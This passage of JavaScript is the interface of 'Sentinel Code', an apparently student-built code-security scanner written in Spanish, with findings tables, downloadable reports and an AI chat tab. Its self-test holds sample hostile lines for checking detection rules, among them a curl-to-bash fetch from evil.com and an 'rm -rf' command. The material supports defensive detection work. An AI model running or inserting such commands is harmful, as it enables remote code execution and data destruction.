    if (count <= maxNodes) n.kids.forEach((k) => me.kids.push(go(k, d + 1)));
    me.x = me.kids.length ? (me.kids[0].x + me.kids[me.kids.length - 1].x) / 2 : leaf++;
    all.push(me); return me;
  };
  go(ast, 0);
  const W = leaf * 112 + 30, H = (maxD + 1) * 64 + 30; let lines = '', boxes = '';
  all.forEach((m) => {
    const cx = m.x * 112 + 56, cy = m.d * 64 + 30;
    m.kids.forEach((k) => { lines += `<line x1="${cx}" y1="${cy + 14}" x2="${k.x * 112 + 56}" y2="${k.d * 64 + 16}" stroke="#a3323f" stroke-width="1"/>`; });
    boxes += `<rect x="${cx - 52}" y="${cy - 14}" width="104" height="28" rx="6" fill="var(--panel)" stroke="#7a1220"/><text x="${cx}" y="${cy + 4}" font-size="10" text-anchor="middle" fill="var(--text)">${escapeHtml(m.label.length > 17 ? m.label.slice(0, 16) + '…' : m.label)}</text>`;
  });
  return `<svg width="${W}" height="${H}" viewBox="0 0 ${W} ${H}" xmlns="http://www.w3.org/2000/svg">${lines}${boxes}</svg>` + (count > maxNodes ? `<div class="panel-subtitle">Árbol recortado a ${maxNodes} nodos (tiene ${count}).</div>` : '');
}
function renderFasesAnalisis(f) {
  const r = f.compiled || compileAll(f.code), by = {};
  r.tokens.forEach((t) => { by[t.tipo] = (by[t.tipo] || 0) + 1; });
  const chips = Object.keys(by).map((k) => `<span class="chip" style="background:var(--bg);margin:2px">${k}: ${by[k]}</span>`).join('');
  const rows = r.tokens.slice(0, 300).map((t) => `<tr><td>${t.tipo}</td><td><code>${escapeHtml(t.lexema)}</code></td><td>${t.linea}</td></tr>`).join('');
  const tree = r.errors.length
    ? r.errors.map((e) => `<div class="warn-banner">Línea ${e.linea}: ${escapeHtml(e.msg)}</div>`).join('') + '<div class="panel-subtitle">Corrige los errores sintácticos para ver el árbol y el análisis semántico.</div>'
    : `<div class="panel-subtitle">Sin errores sintácticos: el código se analizó correctamente (${r.ast.kids.length} sentencia(s) en el programa).</div>`;
  return `<div class="panel-box"><div class="panel-title">1. Análisis léxico: tokens y lexemas (${r.tokens.length})</div><div>${chips}</div><div class="scroll-box" style="margin-top:8px"><table><thead><tr><th>Token</th><th>Lexema</th><th>Línea</th></tr></thead><tbody>${rows}</tbody></table></div>${r.tokens.length > 300 ? '<div class="panel-subtitle">Se muestran los primeros 300.</div>' : ''}</div>
    <div class="panel-box"><div class="panel-title">2. Análisis sintáctico (JavaScript básico)</div>${tree}</div>
    <div class="panel-box"><div class="panel-title">3. Análisis semántico (${r.semantic.length})</div>${r.errors.length ? '<div class="empty-msg">Requiere que el análisis sintáctico no tenga errores.</div>' : renderFindingsTable(r.semantic.map((x) => Object.assign({}, x, { ruta: f.name })))}</div>`;
}
 
function keyOf(f) { return f.tipo + '|' + f.linea; }
function diffFindings(prev, curr) {
  const prevKeys = new Set(prev.map(keyOf));
  const currKeys = new Set(curr.map(keyOf));
  const nuevos = curr.filter((f) => !prevKeys.has(keyOf(f)));
  const resueltos = prev.filter((f) => !currKeys.has(keyOf(f)));
  return { nuevos, resueltos };
}
 
// =======================================================================
// TABLA DE HALLAZGOS
// =======================================================================
function renderFindingsTable(findings) {
  if (!findings || findings.length === 0) {
    return '<div class="empty-msg">Sin hallazgos todavía. Analiza código en la pestaña "Analizador".</div>';
  }
  let rows = '';
  findings.forEach((f) => {
    const expanded = state.expandedId === f.id;
    rows += `<tr class="finding-row" data-finding-id="${f.id}">
      <td style="font-weight:600">${escapeHtml(f.tipo)}</td>
      <td><span class="chip" style="${severityChipStyle(f.gravedad)}">${escapeHtml(f.gravedad)}</span></td>
      <td>${escapeHtml(f.ruta || '')}</td>
      <td>${escapeHtml(f.linea)}</td>
    </tr>`;
    if (expanded) {
      rows += `<tr class="detail-row"><td colspan="4"><div class="detail-box">
        ${f.snippet ? `<div class="detail-snippet">${escapeHtml(f.snippet)}</div>` : ''}
        <div class="detail-label">Descripción</div><div class="detail-text">${escapeHtml(f.descripcion)}</div>
        <div class="detail-label">Recomendación</div><div class="detail-text">${escapeHtml(f.recomendacion)}</div>
        <div class="btn-row">
          <button class="btn ghost suggest-fix-btn" data-finding-id="${f.id}" ${f.fixLoading ? 'disabled' : ''}>${f.fixLoading ? 'Pensando…' : 'Sugerir arreglo con IA'}</button>
        </div>
        ${f.fixSuggestion ? `<div class="fix-box">${escapeHtml(f.fixSuggestion)}</div>` : ''}
      </div></td></tr>`;
    }
  });
  return `<table><thead><tr><th>Tipo</th><th>Gravedad</th><th>Ruta</th><th>Línea</th></tr></thead><tbody>${rows}</tbody></table>`;
}
 
function findFindingById(id) {
  for (const f of state.files) {
    const found = f.findings.find((x) => x.id === id);
    if (found) return found;
  }
  return null;
}
 
function attachFindingsTableEvents(container) {
  container.querySelectorAll('tr.finding-row').forEach((row) => {
    row.addEventListener('click', () => {
      const id = row.getAttribute('data-finding-id');
      state.expandedId = state.expandedId === id ? null : id;
      render();
    });
  });
  container.querySelectorAll('.suggest-fix-btn').forEach((btn) => {
    btn.addEventListener('click', (e) => {
      e.stopPropagation();
      const id = btn.getAttribute('data-finding-id');
      suggestFix(id);
    });
  });
}
 
async function suggestFix(findingId) {
  const finding = findFindingById(findingId);
  if (!finding) return;
  finding.fixLoading = true;
  render();
  try {
    const prompt = 'Da una sugerencia breve y concreta (máximo 5 líneas) de cómo corregir este problema de código. ' +
      'Tipo: ' + finding.tipo + '. Línea: ' + finding.linea + '. Descripción: ' + finding.descripcion + '. ' +
      'Fragmento: ' + (finding.snippet || '(sin fragmento)') + '. Responde en español, directo, sin rodeos.';
    finding.fixSuggestion = await remoteAssistantReply(prompt, '', []);
  } catch (err) {
    finding.fixSuggestion = 'No se pudo obtener una sugerencia (' + err.message + '). Revisa la recomendación general de arriba.';
  }
  finding.fixLoading = false;
  render();
}
 
// =======================================================================
// PANEL
// =======================================================================
function renderPanelTab() {
  const findings = allFindings();
  const score = computeSecurityScore(findings);
  const counts = countBySeverity(findings);
  const activeThreats = findings.filter((f) => f.gravedad === 'Crítica' || f.gravedad === 'Alta').length;
  const max = Math.max(1, counts['Crítica'], counts['Alta'], counts['Media'], counts['Baja']);
  const barColors = { 'Crítica': 'var(--primary)', 'Alta': '#c25b5b', 'Media': '#d8b463', 'Baja': '#8fae8f' };
  let bars = '';
  ['Crítica', 'Alta', 'Media', 'Baja'].forEach((sev) => {
    const v = counts[sev];
    const pct = Math.max((v / max) * 100, v > 0 ? 6 : 0);
    bars += `<div class="bar-col"><span class="bar-value">${v}</span><div class="bar-track"><div class="bar-fill" style="height:${pct}%;background:${barColors[sev]}"></div></div><span class="bar-label">${sev}</span></div>`;
  });
  return `
    <div class="hero">Detección de Patrones de Código Sospechosos en Tiempo Real</div>
    <div class="stats-row">
      <div class="stat-card"><div class="stat-label">Archivos Analizados</div><div class="stat-value" style="background:var(--bg)">${state.files.length}</div></div>
      <div class="stat-card"><div class="stat-label">Puntuación de Seguridad</div><div class="stat-value" style="background:var(--warn-bg);color:var(--warn-text)">${score}/100</div></div>
      <div class="stat-card"><div class="stat-label">Amenazas Activas</div><div class="stat-value" style="background:var(--high-bg);color:var(--high-text)">${activeThreats} Detectadas</div></div>
    </div>
    <div class="two-col">
      <div class="panel-box"><div class="panel-title">Hallazgos por Gravedad</div><div class="chart-wrap">${bars}</div></div>
      <div class="panel-box"><div class="panel-title">Hallazgos Recientes (todos los archivos)</div>${renderFindingsTable(findings.slice(0, 10))}</div>
    </div>
    ${findings.length === 0 ? '<button class="btn primary" id="go-analyzer-btn">Ir al Analizador →</button>' : ''}
  `;
}
 
// =======================================================================
// ANALIZADOR
// =======================================================================
function buildGutter(code) {
  const n = code.split('\n').length;
  let lines = [];
  for (let i = 1; i <= n; i++) lines.push(i);
  return lines.join('\n');
}
 
function renderAnalizadorTab() {
  const f = activeFile();
  let fileTabs = state.files.map((file) => `
    <div class="file-tab ${file.id === state.activeFileId ? 'active' : ''}" data-file-id="${file.id}">
      <span class="select-file">${escapeHtml(file.name)}</span>
      ${state.files.length > 1 ? `<span class="close-x" data-close-file="${file.id}">✕</span>` : ''}
    </div>`).join('');
 
  let historyHtml = '';
  if (state.history.length > 0) {
    historyHtml = '<div class="panel-box"><div class="panel-title">Historial reciente</div>' +
      state.history.map((h, i) => `
        <div class="history-item">
          <span>${escapeHtml(h.name)} — ${h.score}/100 — ${h.count} hallazgo(s) — ${escapeHtml(h.ts)}</span>
          <button class="btn ghost load-history-btn" data-history-index="${i}">Cargar</button>
        </div>`).join('') + '</div>';
  }
 
  let compareHtml = '';
  if (f.prevFindings) {
    const { nuevos, resueltos } = diffFindings(f.prevFindings, f.findings);
    compareHtml = `<div class="compare-box">
      <strong>Comparación con el análisis anterior de este archivo:</strong><br/>
      <span class="new-item">${nuevos.length} hallazgo(s) nuevo(s)</span> · <span class="fixed-item">${resueltos.length} resuelto(s)</span>
      ${nuevos.length ? '<ul>' + nuevos.map(n => '<li class="new-item">' + escapeHtml(n.tipo) + ' (línea ' + n.linea + ')</li>').join('') + '</ul>' : ''}
      ${resueltos.length ? '<ul>' + resueltos.map(n => '<li class="fixed-item">' + escapeHtml(n.tipo) + ' (línea ' + n.linea + ') — ya no aparece</li>').join('') + '</ul>' : ''}
    </div>`;
  }
 
  const warnBanner = f.code.length > MAX_CODE_LENGTH
    ? `<div class="warn-banner">Este archivo tiene ${f.code.length} caracteres, más del límite recomendado (${MAX_CODE_LENGTH}). El análisis puede tardar más de lo normal.</div>`
    : '';
 
  return `
    <div class="file-tabs">${fileTabs}
      <button class="btn ghost" id="add-file-btn">+ Agregar archivo</button>
      <button class="btn ghost" id="load-file-btn">Cargar archivo</button>
      <input type="file" id="file-input-hidden" style="display:none" accept=".js,.py,.php,.java,.ts,.jsx,.tsx,.txt,.rb,.go,.c,.cpp,.cs" />
    </div>
    <label class="field-label">Nombre de archivo</label>
    <input type="text" id="filename-input" value="${escapeHtml(f.name)}" placeholder="/api/user/login.js" />
    <label class="field-label">Código (cualquier lenguaje)</label>
    ${warnBanner}
    <div class="editor-wrap">
      <div class="gutter" id="code-gutter">${buildGutter(f.code)}</div>
      <textarea id="code-input" spellcheck="false">${escapeHtml(f.code)}</textarea>
    </div>
    <div class="btn-row">
      <button class="btn primary" id="analyze-btn">Analizar este archivo</button>
      <button class="btn ghost" id="analyze-all-btn">Analizar todos (${state.files.length})</button>
      <button class="btn ghost" id="download-txt-btn">Descargar reporte (TXT)</button>
      <button class="btn ghost" id="download-html-btn">Descargar reporte (HTML)</button>
    </div>
    ${compareHtml}
    <div class="panel-box" style="margin-top:18px">
      <div class="panel-title">Hallazgos de "${escapeHtml(f.name)}" ${f.findings.length > 0 ? '(' + f.findings.length + ')' : ''}</div>
      ${renderFindingsTable(f.findings)}
    </div>
    ${renderFasesAnalisis(f)}
    ${historyHtml}
  `;
}
 
// =======================================================================
// REGLAS
// =======================================================================
function renderReglasTab() {
  const rows = ALL_CATEGORIES.map((cat) => `
    <div class="rule-row">
      <span>${escapeHtml(cat)}</span>
      <label class="switch">
        <input type="checkbox" class="rule-toggle" data-category="${escapeHtml(cat)}" ${state.ruleConfig[cat] !== false ? 'checked' : ''} />
        <span class="slider"></span>
      </label>
    </div>`).join('');
  return `
    <div class="panel-box">
      <div class="panel-title">Categorías activas</div>
      <div class="panel-subtitle" style="margin-bottom:10px">Desactiva las categorías que no te interesen para este análisis. Se guarda en tu navegador.</div>
      ${rows}
    </div>
  `;
}
 
// =======================================================================
// ASISTENTE IA
// =======================================================================
function renderAsistenteTab() {
  let bubbles = '';
  state.chatMessages.forEach((m) => { bubbles += `<div class="bubble ${m.role}">${escapeHtml(m.text)}</div>`; });
  return `
    <div class="chat-container">
      <div class="chat-config" id="ai-status">Este asistente usa el modelo de Claude a través de este mismo Worker (endpoint /api/ask).</div>
      <div class="chat-log" id="chat-log">${bubbles}${state.chatLoading ? '<div class="bubble assistant">Pensando…</div>' : ''}</div>
      <div class="chat-input-row">
        <input type="text" id="chat-input" placeholder="Pregúntame sobre los hallazgos..." />
        <button class="btn primary" id="chat-send-btn">Enviar</button>
      </div>
    </div>
  `;
}
 
function localAssistantReply(userText, findings) {
  const text = userText.toLowerCase();
  if (findings.length === 0) return 'Aún no veo hallazgos para este código. Analiza algo primero en la pestaña "Analizador".';
  const criticas = findings.filter((f) => f.gravedad === 'Crítica');
  const altas = findings.filter((f) => f.gravedad === 'Alta');
  if (text.includes('resum') || text.trim() === '') {
    return 'Encontré ' + findings.length + ' hallazgo(s): ' + criticas.length + ' crítico(s), ' + altas.length + ' de gravedad alta. ' +
      (criticas.length ? 'Lo más urgente es "' + criticas[0].tipo + '" en la línea ' + criticas[0].linea + '. ' : '') +
      'Pregúntame por el tipo de hallazgo o pide "cómo lo arreglo".';
  }
  const match = findings.find((f) => text.includes(f.tipo.toLowerCase().split(' ')[0]) || text.includes(f.categoria.toLowerCase().split(' ')[0]));
  if (match) return '"' + match.tipo + '" (línea ' + match.linea + ', gravedad ' + match.gravedad + '): ' + match.descripcion + '\n\nRecomendación: ' + match.recomendacion;
  if (text.includes('arregl') || text.includes('fix') || text.includes('soluci')) {
    const top = criticas[0] || altas[0] || findings[0];
    return 'Empieza por "' + top.tipo + '" en la línea ' + top.linea + ': ' + top.recomendacion;
  }
  return 'No encontré ese término entre los hallazgos actuales. Prueba con "resumen" o "cómo lo arreglo".';
}
 
async function remoteAssistantReply(question, code, findings) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 25000);
  try {
    const res = await fetch('/api/ask', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ question, code: (code || '').slice(0, MAX_CODE_FOR_AI), findings }),
      signal: controller.signal,
    });
    clearTimeout(timeoutId);
    if (!res.ok) {
      const errBody = await res.text().catch(() => '');
      throw new Error('El servidor respondió con estado ' + res.status + (errBody ? ': ' + errBody : ''));
    }
    const data = await res.json();
    if (data.error) throw new Error(data.error);
    return data.reply || JSON.stringify(data);
  } catch (err) {
    clearTimeout(timeoutId);
    if (err.name === 'AbortError') throw new Error('La IA tardó demasiado en responder (timeout).');
    throw err;
  }
}
 
async function sendChatMessage(text) {
  state.chatMessages.push({ role: 'user', text });
  state.chatLoading = true;
  render();
  let replyText;
  try {
    replyText = await remoteAssistantReply(text, activeFile().code, allFindings());
  } catch (err) {
    replyText = localAssistantReply(text, allFindings());
  }
  state.chatMessages.push({ role: 'assistant', text: replyText });
  state.chatLoading = false;
  saveJSON('sentinelcode_chat', state.chatMessages);
  render();
  const log = document.getElementById('chat-log');
  if (log) log.scrollTop = log.scrollHeight;
}
 
// =======================================================================
// REPORTES DESCARGABLES
// =======================================================================
function buildReportLines(f) {
  const lines = [];
  lines.push('SENTINEL CODE — REPORTE DE ANÁLISIS');
  lines.push('Archivo: ' + f.name);
  lines.push('Puntuación de seguridad: ' + computeSecurityScore(f.findings) + '/100');
  lines.push('Total de hallazgos: ' + f.findings.length);
  lines.push('');
  f.findings.forEach((finding, i) => {
    lines.push((i + 1) + '. [' + finding.gravedad + '] ' + finding.tipo + ' (línea ' + finding.linea + ')');
    lines.push('   ' + finding.descripcion);
    lines.push('   Recomendación: ' + finding.recomendacion);
    lines.push('');
  });
  return lines;
}
 
function triggerDownload(filename, content, mime) {
  const blob = new Blob([content], { type: mime });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url; a.download = filename;
  document.body.appendChild(a); a.click(); document.body.removeChild(a);
  URL.revokeObjectURL(url);
}
 
function downloadReportTxt() {
  const f = activeFile();
  triggerDownload('reporte-' + f.name.replace(/[^a-z0-9.]/gi, '_') + '.txt', buildReportLines(f).join('\n'), 'text/plain');
}
 
function downloadReportHtml() {
  const f = activeFile();
  const rowsHtml = f.findings.map((finding, i) => `
    <tr><td>${i + 1}</td><td>${escapeHtml(finding.tipo)}</td><td>${escapeHtml(finding.gravedad)}</td><td>${finding.linea}</td>
    <td>${escapeHtml(finding.descripcion)}</td><td>${escapeHtml(finding.recomendacion)}</td></tr>`).join('');
  const html = `<!DOCTYPE html><html lang="es"><head><meta charset="UTF-8"><title>Reporte — ${escapeHtml(f.name)}</title>
  <style>body{font-family:sans-serif;padding:24px;background:#eceae4;color:#1c1c1c}
  table{border-collapse:collapse;width:100%;background:#fff}
  th,td{border:1px solid #dedad0;padding:8px;text-align:left;font-size:13px}
  th{background:#141414;color:#fff}
  h1{color:#7a1220}</style></head><body>
  <h1>Sentinel Code — Reporte de Análisis</h1>
  <p><strong>Archivo:</strong> ${escapeHtml(f.name)}<br/>
  <strong>Puntuación de seguridad:</strong> ${computeSecurityScore(f.findings)}/100<br/>
  <strong>Total de hallazgos:</strong> ${f.findings.length}</p>
  <table><thead><tr><th>#</th><th>Tipo</th><th>Gravedad</th><th>Línea</th><th>Descripción</th><th>Recomendación</th></tr></thead>
  <tbody>${rowsHtml}</tbody></table></body></html>`;
  triggerDownload('reporte-' + f.name.replace(/[^a-z0-9.]/gi, '_') + '.html', html, 'text/html');
}
 
// =======================================================================
// AUTOTEST (correr desde la consola del navegador: testSelf())
// =======================================================================
window.testSelf = function () {
  const samples = {
    'eval-usage': 'eval(userInput);',
    'function-constructor': 'const f = new Function("a", "return a;");',
    'child-process-exec': "const { execSync } = require('child_process'); execSync('ls');",
    'os-system-python': "os.system('rm -rf ' + path)",
    'curl-pipe-bash': "exec('curl http://evil.com/x.sh | bash')",
    'sql-string-concat': 'const q = "SELECT * FROM users WHERE id=\'" + id + "\'";',
    'sql-fstring': 'query = f"SELECT * FROM users WHERE id={user_id}"',
    'hardcoded-secret': 'const apiKey = "abcd1234efgh5678";',
    'secret-in-url': 'fetch("https://api.example.com/data?api_key=abcd1234")',
    'innerhtml-assign': 'el.innerHTML = "<b>" + name + "</b>";',
    'document-write': 'document.write(userInput);',
    'dangerously-set-innerhtml': '<div dangerouslySetInnerHTML={{__html: data}} />',
    'pickle-loads': 'data = pickle.loads(raw_bytes)',
    'php-unserialize': '$obj = unserialize($_GET["data"]);',
    'insecure-tls': 'https.request({ rejectUnauthorized: false })',
    'insecure-random': 'const token = Math.random().toString();',
    'weak-hash': "crypto.createHash('md5').update(pw)",
    'todo-fixme': '// TODO: arreglar esto',
    'console-log-leftover': 'console.log("password:", pw);',
  };
  let pass = 0, fail = 0;
  RULES.forEach((rule) => {
    const sample = samples[rule.id];
    if (!sample) { console.warn('Sin muestra de prueba para', rule.id); return; }
    const matched = rule.regex.test(sample);
    if (matched) { pass++; } else { fail++; console.error('FALLÓ:', rule.id, '— no coincide con:', sample); }
  });
  const brokenSample = 'function f(a, b {\n  let s = "no cierra;\n}';
  const okSample = 'function f(a, b) {\n  let s = "todo bien";\n  return a + b;\n}';
  const brokenFindings = checkSyntax(brokenSample);
  const okFindings = checkSyntax(okSample);
  console.log('Reglas de patrones: ' + pass + ' OK, ' + fail + ' fallidas de ' + RULES.length + '.');
  console.log('checkSyntax en código roto detectó ' + brokenFindings.length + ' problema(s) (se esperaba > 0).');
  console.log('checkSyntax en código válido detectó ' + okFindings.length + ' problema(s) (se esperaba 0).');
  const t1 = lex('let a = 1;'), c1 = compileAll('let x = 1;\nconsole.log(y);\nconst z = 2;\nz = 3;'), c2 = compileAll('let a = ;');
  console.log('Lexer: ' + t1.length + ' tokens (esperado 5). Semántico: ' + c1.semantic.map((s) => s.tipo).join(', ') + '. Errores sintácticos en código roto: ' + c2.errors.length);
  return { lexerTokens: t1.length, semantico: c1.semantic.length, sintacticoRoto: c2.errors.length, reglasOk: pass, reglasFallidas: fail, sintaxisRotaDetecto: brokenFindings.length, sintaxisValidaFalsosPositivos: okFindings.length };
};
 
// =======================================================================
// RENDER PRINCIPAL Y EVENTOS
// =======================================================================
function render() {
  document.querySelectorAll('.tab-btn').forEach((btn) => btn.classList.toggle('active', btn.getAttribute('data-tab') === state.tab));
  const content = document.getElementById('content');
  if (state.tab === 'panel') content.innerHTML = renderPanelTab();
  else if (state.tab === 'analizador') content.innerHTML = renderAnalizadorTab();
  else if (state.tab === 'reglas') content.innerHTML = renderReglasTab();
  else content.innerHTML = renderAsistenteTab();
 
  attachFindingsTableEvents(content);
 
  if (state.tab === 'panel') {
    const goBtn = document.getElementById('go-analyzer-btn');
    if (goBtn) goBtn.addEventListener('click', () => { state.tab = 'analizador'; render(); });
  }
 
  if (state.tab === 'analizador') {
    const f = activeFile();
    document.getElementById('filename-input').addEventListener('input', (e) => { f.name = e.target.value; });
    const codeInput = document.getElementById('code-input');
    const gutter = document.getElementById('code-gutter');
    codeInput.addEventListener('input', (e) => { f.code = e.target.value; gutter.textContent = buildGutter(f.code); });
    codeInput.addEventListener('scroll', () => { gutter.scrollTop = codeInput.scrollTop; });
 
    document.getElementById('analyze-btn').addEventListener('click', () => {
      f.prevFindings = f.findings.length ? f.findings : null;
      f.findings = analyzeCode(f.code, f.name);
      f.compiled = compileAll(f.code);
      state.expandedId = null;
      pushHistory(f);
      render();
    });
    document.getElementById('analyze-all-btn').addEventListener('click', () => {
      state.files.forEach((file) => {
        file.prevFindings = file.findings.length ? file.findings : null;
        file.findings = analyzeCode(file.code, file.name);
        file.compiled = compileAll(file.code);
      });
      pushHistory(f);
      render();
    });
    document.getElementById('download-txt-btn').addEventListener('click', downloadReportTxt);
    document.getElementById('download-html-btn').addEventListener('click', downloadReportHtml);
    document.getElementById('add-file-btn').addEventListener('click', () => {
      const nf = { id: uid(), name: 'archivo-' + (state.files.length + 1) + '.js', code: '', findings: [], prevFindings: null };
      state.files.push(nf); state.activeFileId = nf.id; render();
    });
    document.getElementById('load-file-btn').addEventListener('click', () => document.getElementById('file-input-hidden').click());
    document.getElementById('file-input-hidden').addEventListener('change', (e) => {
      const file = e.target.files[0];
      if (!file) return;
      const reader = new FileReader();
      reader.onload = () => {
        const nf = { id: uid(), name: file.name, code: reader.result, findings: [], prevFindings: null };
        state.files.push(nf); state.activeFileId = nf.id; render();
      };
      reader.readAsText(file);
    });
    content.querySelectorAll('.file-tab .select-file').forEach((el) => {
      el.addEventListener('click', () => { state.activeFileId = el.closest('.file-tab').getAttribute('data-file-id'); state.expandedId = null; render(); });
    });
    content.querySelectorAll('.close-x').forEach((el) => {
      el.addEventListener('click', (e) => {
        e.stopPropagation();
        const id = el.getAttribute('data-close-file');
        state.files = state.files.filter((x) => x.id !== id);
        if (state.activeFileId === id) state.activeFileId = state.files[0].id;
        render();
      });
    });
    content.querySelectorAll('.load-history-btn').forEach((btn) => {
      btn.addEventListener('click', () => {
        const h = state.history[parseInt(btn.getAttribute('data-history-index'), 10)];
        if (!h) return;
        const cur = activeFile();
        cur.name = h.name; cur.code = h.code; cur.findings = h.findings; cur.prevFindings = null;
        render();
      });
    });
  }
 
  if (state.tab === 'reglas') {
    content.querySelectorAll('.rule-toggle').forEach((toggle) => {
      toggle.addEventListener('change', (e) => {
        state.ruleConfig[e.target.getAttribute('data-category')] = e.target.checked;
        saveJSON('sentinelcode_ruleconfig', state.ruleConfig);
      });
    });
  }
 
  if (state.tab === 'asistente') {
    const input = document.getElementById('chat-input');
    const send = () => { const text = input.value.trim(); if (!text || state.chatLoading) return; input.value = ''; sendChatMessage(text); };
    document.getElementById('chat-send-btn').addEventListener('click', send);
    input.addEventListener('keydown', (e) => { if (e.key === 'Enter') send(); });
    const log = document.getElementById('chat-log');
    if (log) log.scrollTop = log.scrollHeight;
  }
}
 
function pushHistory(f) {
  state.history.unshift({ ts: new Date().toLocaleString('es-MX'), name: f.name, score: computeSecurityScore(f.findings), count: f.findings.length, code: f.code, findings: f.findings });
  state.history = state.history.slice(0, MAX_HISTORY);
  saveJSON('sentinelcode_history', state.history);
}
 
document.querySelectorAll('.tab-btn').forEach((btn) => btn.addEventListener('click', () => { state.tab = btn.getAttribute('data-tab'); render(); }));
 
// Análisis inicial con el ejemplo precargado.
activeFile().findings = analyzeCode(activeFile().code, activeFile().name);
render();
